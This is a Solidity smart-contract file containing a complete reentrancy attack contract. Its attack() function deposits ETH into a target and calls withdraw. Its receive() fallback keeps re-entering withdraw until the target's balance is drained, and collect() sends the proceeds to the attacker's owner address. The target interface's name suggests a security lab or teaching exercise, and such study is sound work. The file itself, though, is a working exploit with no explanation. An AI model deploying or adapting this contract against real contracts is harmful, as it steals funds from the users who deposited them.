// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableReentrancy {
    function deposit() external payable;
    function withdraw() external;
    function getContractBalance() external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableReentrancy public target;
    address public owner;

    constructor(address _target) {
        target = IVulnerableReentrancy(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}